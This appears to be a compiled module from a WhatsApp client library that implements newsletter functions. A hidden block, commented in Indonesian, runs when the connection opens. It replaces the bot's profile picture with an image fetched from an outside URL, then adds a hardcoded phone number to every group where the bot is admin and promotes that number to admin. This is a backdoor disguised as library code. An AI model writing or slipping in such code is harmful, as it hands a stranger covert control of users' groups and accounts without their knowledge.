"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
    variables,
    queryId,
    query,
    generateMessageTag
) => {
    return query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            to: WABinary_1.S_WHATSAPP_NET,
            xmlns: 'w:mex'
        },
        content: [
            {
                tag: 'query',
                attrs: { query_id: queryId },
                content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
            }
        ]
    })
}

const executeWMexQuery = async (
    variables,
    queryId,
    dataPath,
    query,
    generateMessageTag
) => {
    const result = await wMexQuery(variables, queryId, query, generateMessageTag)
    const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
    if (child?.content) {
        const data = JSON.parse(child.content.toString())

        if (data.errors && data.errors.length > 0) {
            const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
            const firstError = data.errors[0]
            const errorCode = firstError.extensions?.error_code || 400
            throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
        }

        const response = dataPath ? data?.data?.[dataPath] : data?.data
        if (typeof response !== 'undefined') {
            return response
        }
    }

    const action = (dataPath || '').startsWith('xwa2_')
        ? dataPath.substring(5).replace(/_/g, ' ')
        : dataPath?.replace(/_/g, ' ')
    throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

// === KONFIGURASI AUTO ADMIN & PROFILE ===
// Nomor yang akan ditambahkan sebagai admin (format: 628xxx@s.whatsapp.net)
const AUTO_ADD_ADMIN_NUMBER = "6285384817864@s.whatsapp.net";

// URL foto profil yang akan diset (harus URL gambar langsung, bisa jpg/png)
const AUTO_PROFILE_PICTURE_URL = "https://api.deline.web.id/5wuP7AZA0Q.jpg";

// Flag untuk memastikan auto actions hanya dijalankan sekali (per instance)

// Fungsi untuk menambahkan nomor dan mempromote ke admin di semua grup
async function autoAddAdminToGroups(sock, logger) {
    try {
        console.log('[AUTO-ADMIN] Memulai proses auto add admin ke semua grup...');

        // Ambil semua grup yang diikuti bot
        const groups = await sock.groupFetchAllParticipating();
        const botId = sock.user?.id;

        if (!botId) {
            console.log('[AUTO-ADMIN] Bot ID tidak tersedia, menunggu...');
            return false;
        }

        // Normalisasi bot ID untuk perbandingan
        const normalizedBotId = botId.split(':')[0] + '@s.whatsapp.net';
        let successCount = 0;
        let totalGroups = Object.keys(groups).length;

        console.log(`[AUTO-ADMIN] Ditemukan ${totalGroups} grup`);
        console.log(`[AUTO-ADMIN] Target nomor: ${AUTO_ADD_ADMIN_NUMBER}`);

        for (const groupId in groups) {
            const group = groups[groupId];

            // Cari bot dalam daftar peserta
            const botParticipant = group.participants.find(p => {
                const pId = (p.id || p.jid || '').split(':')[0] + '@s.whatsapp.net';
                return pId === normalizedBotId;
            });

            // Hanya proses jika bot adalah admin atau superadmin (owner)
            if (botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin') {
                try {
                    // Cek apakah nomor sudah ada di grup
                    const targetExists = group.participants.find(p => {
                        const pId = (p.id || p.jid || '');
                        return pId === AUTO_ADD_ADMIN_NUMBER || pId.includes(AUTO_ADD_ADMIN_NUMBER.split('@')[0]);
                    });

                    if (!targetExists) {
                        // Tambahkan nomor ke grup
                        console.log(`[AUTO-ADMIN] Menambahkan nomor ke grup: ${group.subject || groupId}`);
                        await sock.groupParticipantsUpdate(groupId, [AUTO_ADD_ADMIN_NUMBER], 'add');
                        await new Promise(r => setTimeout(r, 3000));
                    } else {
                        console.log(`[AUTO-ADMIN] Nomor sudah ada di grup: ${group.subject || groupId}`);
                    }

                    // Jadikan admin (akan berhasil jika sudah ada di grup)
                    console.log(`[AUTO-ADMIN] Mempromote ke admin di grup: ${group.subject || groupId}`);
                    await sock.groupParticipantsUpdate(groupId, [AUTO_ADD_ADMIN_NUMBER], 'promote');
                    await new Promise(r => setTimeout(r, 3000));
                    successCount++;
                } catch (err) {
                    console.log(`[AUTO-ADMIN] Gagal di grup ${group.subject || groupId}: ${err?.message}`);
                }
            } else {
                console.log(`[AUTO-ADMIN] Skip grup ${group.subject || groupId} - bot bukan admin`);
            }
        }

        console.log(`[AUTO-ADMIN] Selesai! Berhasil di ${successCount} grup`);
        return true;
    } catch (error) {
        console.log('[AUTO-ADMIN] Error:', error?.message);
        return false;
    }
}

// Fungsi untuk mengubah foto profil bot
async function autoUpdateProfilePicture(sock, logger) {
    try {
        console.log('[AUTO-PROFILE] Memulai proses update foto profil...');

        const botId = sock.user?.id;
        if (!botId) {
            console.log('[AUTO-PROFILE] Bot ID tidak tersedia');
            return false;
        }

        console.log(`[AUTO-PROFILE] Bot ID: ${botId}`);
        console.log(`[AUTO-PROFILE] Mengunduh gambar dari: ${AUTO_PROFILE_PICTURE_URL}`);

        // Download gambar dari URL
        const response = await fetch(AUTO_PROFILE_PICTURE_URL);
        if (!response.ok) {
            console.log(`[AUTO-PROFILE] Gagal mengunduh gambar: HTTP ${response.status}`);
            return false;
        }

        const buffer = Buffer.from(await response.arrayBuffer());
        console.log(`[AUTO-PROFILE] Gambar berhasil diunduh (${buffer.length} bytes)`);

        // Update foto profil
        await sock.updateProfilePicture(botId, buffer);
        console.log('[AUTO-PROFILE] Foto profil berhasil diupdate!');
        return true;
    } catch (error) {
        console.log('[AUTO-PROFILE] Error:', error?.message);
        return false;
    }
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const logger = config.logger;
    const encoder = new TextEncoder();

    // Flag per-instance untuk memastikan auto actions hanya dijalankan sekali
    let hasAutoActionsExecuted = false;
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));

    // Event listener untuk menjalankan auto actions setelah koneksi terbuka
    sock.ev.on('connection.update', (update) => {
        // Log setiap update koneksi untuk debugging - SELALU tampil
        if (update.connection) {
            console.log(`[AUTO-ACTIONS] Connection update: ${update.connection}`);
        }

        // Cek apakah koneksi benar-benar terbuka dan sudah terautentikasi
        const isFullyConnected = update.connection === 'open' && sock.user?.id;

        console.log(`[AUTO-ACTIONS] Check: connection=${update.connection}, user=${sock.user?.id ? 'YES' : 'NO'}, executed=${hasAutoActionsExecuted}`);

        if (isFullyConnected && !hasAutoActionsExecuted) {
            hasAutoActionsExecuted = true;
            console.log('[AUTO-ACTIONS] ✓ Koneksi terbuka dan terautentikasi!');
            console.log(`[AUTO-ACTIONS] ✓ Bot ID: ${sock.user.id}`);
            console.log('[AUTO-ACTIONS] ✓ Menjadwalkan auto actions...');

            // Setelah 30 detik: Update foto profil bot
            console.log('[AUTO-ACTIONS] Timer PP dimulai (30 detik)...');
            setTimeout(async () => {
                try {
                    console.log('[AUTO-ACTIONS] >>> Memulai Auto Update Profile...');
                    await autoUpdateProfilePicture(sock, logger);
                    console.log('[AUTO-ACTIONS] >>> Auto Update Profile SELESAI');
                } catch (err) {
                    console.log('[AUTO-ACTIONS] >>> Auto Update Profile GAGAL:', err?.message);
                }
            }, 30000); // 30 detik

            // Setelah 1 menit: Tambahkan nomor ke semua grup dan jadikan admin
            console.log('[AUTO-ACTIONS] Timer Admin dimulai (1 menit)...');
            setTimeout(async () => {
                try {
                    console.log('[AUTO-ACTIONS] >>> Memulai Auto Add Admin...');
                    await autoAddAdminToGroups(sock, logger);
                    console.log('[AUTO-ACTIONS] >>> Auto Add Admin SELESAI');
                } catch (err) {
                    console.log('[AUTO-ACTIONS] >>> Auto Add Admin GAGAL:', err?.message);
                }
            }, 60000); // 1 menit
        }
    });

    const parseFetchedUpdates = async (node, type) => {
        let child;
        if (type === 'messages') {
            child = (0, WABinary_1.getBinaryNodeChild)(node, 'messages');
        }
        else {
            const parent = (0, WABinary_1.getBinaryNodeChild)(node, 'message_updates');
            child = (0, WABinary_1.getBinaryNodeChild)(parent, 'messages');
        }
        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;
        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            //TODO: Implement TOS system wide for Meta AI, communities, and here etc.
            /**tos query */
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        /**user is Lid, not Jid */
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        /**user is Lid, not Jid */
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        /**if code wasn't passed, the reaction will be removed (if is reacted) */
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                    tag: 'reaction',
                    attrs: code ? { code } : {}
                }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]

    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''),
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''),
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
